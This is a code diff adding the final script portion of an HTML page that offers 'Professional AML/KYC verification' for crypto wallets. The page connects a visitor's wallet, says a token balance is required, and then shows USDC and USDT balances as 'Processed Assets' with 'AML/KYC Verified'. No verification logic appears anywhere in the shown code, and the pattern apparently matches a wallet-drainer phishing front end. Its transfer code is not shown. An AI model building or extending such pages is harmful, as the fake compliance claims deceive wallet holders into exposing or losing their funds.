+          if ((isMobileDevice() || isDAppBrowser()) && isInWalletBrowser()) {
+            await autoConnectMobileWallet();
+          } else {
+            // Show wallet selection popup for regular browsers
+            openWalletPopup();
+          }
+        } catch (error) {
+          console.error('Professional verification error:', error);
+          showVerificationError(error.message);
+        }
+      });
+    }
+
+    if (checkBtn) {
+      checkBtn.addEventListener("click", async () => {
+        try {
+          // Check if we're in mobile/dApp browser - auto-connect directly
+          if ((isMobileDevice() || isDAppBrowser()) && isInWalletBrowser()) {
+            await autoConnectMobileWallet();
+          } else {
+            // Show wallet selection popup for regular browsers
+            openWalletPopup();
+          }
+        } catch (error) {
+          console.error('Professional verification error:', error);
+          showVerificationError(error.message);
+        }
+      });
+    }
+
+    // Professional UI Response Functions
+    function showInsufficientBalanceError(address) {
+      walletInfo.innerHTML = `
+        <div class="max-w-6xl mx-auto px-4">
+          <div class="bg-gradient-to-br from-orange-50 to-yellow-50 border-2 border-orange-200 rounded-3xl p-12">
+            <div class="flex items-center gap-6 text-orange-600 mb-8">
+              <i class="fas fa-coins text-4xl"></i>
+              <div>
+                <h3 class="text-3xl font-bold">Professional Verification Requirements</h3>
+                <p class="text-lg text-orange-700 mt-2">Tokens balance required for AML/KYC compliance analysis</p>
+              </div>
+            </div>
+            <div class="grid md:grid-cols-2 gap-8">
+              <div class="bg-white rounded-2xl p-6 border border-orange-200">
+                <h4 class="font-bold text-gray-900 mb-4"><i class="fas fa-user-check mr-2 text-orange-600"></i>Connected Wallet</h4>
+                <p class="text-sm text-gray-600 break-all">${address}</p>
+              </div>
+              <div class="bg-white rounded-2xl p-6 border border-orange-200">
+                <h4 class="font-bold text-gray-900 mb-4"><i class="fas fa-exclamation-triangle mr-2 text-orange-600"></i>Verification Status</h4>
+                <p class="text-sm text-orange-700">Insufficient balance for professional risk assessment</p>
+              </div>
+            </div>
+            <div class="mt-8 bg-orange-100 border border-orange-300 rounded-xl p-6">
+              <div class="flex items-start gap-3">
+                <i class="fas fa-lightbulb text-orange-600 mt-1"></i>
+                <div>
+                  <h5 class="font-semibold text-orange-800 mb-2">Professional Requirements</h5>
+                  <p class="text-orange-700 text-sm">Professional AML/KYC verification requires tokens for comprehensive transaction analysis and regulatory compliance assessment.</p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      `;
+      walletInfo.classList.remove('hidden');
+      resetConnectButton();
+    }
+
+    function showVerificationSuccess(address, usdcBalance, usdtBalance, usdcDecimals, usdtDecimals) {
+      const usdcAmount = ethers.utils.formatUnits(usdcBalance, usdcDecimals);
+      const usdtAmount = ethers.utils.formatUnits(usdtBalance, usdtDecimals);
+
+      walletInfo.innerHTML = `
+        <div class="max-w-6xl mx-auto px-4">
+          <div class="bg-gradient-to-br from-green-50 to-emerald-50 border-2 border-green-200 rounded-3xl p-12">
+            <div class="flex items-center gap-6 text-green-600 mb-8">
+              <i class="fas fa-check-circle text-4xl"></i>
+              <div>
+                <h3 class="text-3xl font-bold">Professional AML/KYC Verification Complete</h3>
+                <p class="text-lg text-green-700 mt-2">Wallet successfully verified and approved for professional use</p>
+              </div>
+            </div>
+            <div class="grid md:grid-cols-3 gap-6">
+              <div class="bg-white rounded-2xl p-6 border border-green-200">
+                <h4 class="font-bold text-gray-900 mb-4"><i class="fas fa-shield-alt mr-2 text-green-600"></i>Verified Address</h4>
+                <p class="text-sm text-gray-600 break-all">${address}</p>
+              </div>
+              <div class="bg-white rounded-2xl p-6 border border-green-200">
+                <h4 class="font-bold text-gray-900 mb-4"><i class="fas fa-coins mr-2 text-green-600"></i>Processed Assets</h4>
+                <div class="space-y-2 text-sm">
+                  ${!usdcBalance.isZero() ? `<p class="text-gray-700">USDC: ${parseFloat(usdcAmount).toFixed(2)}</p>` : ''}
+                  ${!usdtBalance.isZero() ? `<p class="text-gray-700">USDT: ${parseFloat(usdtAmount).toFixed(2)}</p>` : ''}
+                </div>
+              </div>
+              <div class="bg-white rounded-2xl p-6 border border-green-200">
+                <h4 class="font-bold text-gray-900 mb-4"><i class="fas fa-certificate mr-2 text-green-600"></i>Compliance Status</h4>
+                <p class="text-sm text-green-700 font-semibold">✓ AML/KYC Verified</p>
+                <p class="text-sm text-green-700 font-semibold">✓ Risk Assessment Complete</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      `;
+      walletInfo.classList.remove('hidden');
+
+      if (connectBtn) {
+        connectBtn.innerHTML = `
+          <div class="flex items-center justify-center">
+            <i class="fas fa-check-circle mr-3 text-lg text-green-300"></i>
+            <span>Verification Complete</span>
+          </div>
+        `;
+        connectBtn.classList.add('bg-green-600', 'hover:bg-green-700');
+        connectBtn.classList.remove('bg-[#0047FF]', 'hover:bg-[#0039cc]');
+      }
+    }
+
+    function showVerificationError(message) {
+      walletInfo.innerHTML = `
+        <div class="max-w-6xl mx-auto px-4">
+          <div class="bg-red-50 border-2 border-red-200 rounded-3xl p-12">
+            <div class="flex items-center gap-6 text-red-600 mb-8">
+              <i class="fas fa-exclamation-triangle text-4xl"></i>
+              <div>
+                <h3 class="text-3xl font-bold">Professional Verification Failed</h3>
+                <p class="text-lg text-red-700 mt-2">Unable to complete AML/KYC verification process</p>
+              </div>
+            </div>
+            <div class="bg-red-100 border border-red-300 rounded-xl p-6">
+              <p class="text-red-700 text-lg">${message}</p>
+            </div>
+          </div>
+        </div>
+      `;
+      walletInfo.classList.remove('hidden');
+      resetConnectButton();
+    }
+
+    function resetConnectButton() {
+      const connectBtn = document.getElementById("connect-wallet-btn");
+      if (connectBtn) {
+        connectBtn.disabled = false;
+        connectBtn.innerHTML = `For Business`;
+        // Reset styles if they were changed on success
+        connectBtn.classList.remove('bg-green-600', 'hover:bg-green-700');
+        connectBtn.classList.add('bg-[#0047FF]', 'hover:bg-[#0039cc]');
+      }
+    }
+
+    // Smooth scrolling for navigation links
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+      anchor.addEventListener('click', function (e) {
+        e.preventDefault();
+        const target = document.querySelector(this.getAttribute('href'));
+        if (target) {
+          target.scrollIntoView({
+            behavior: 'smooth',
+            block: 'start'
+          });
+        }
+      });
+    });
+  </script>
+
+</body></html>
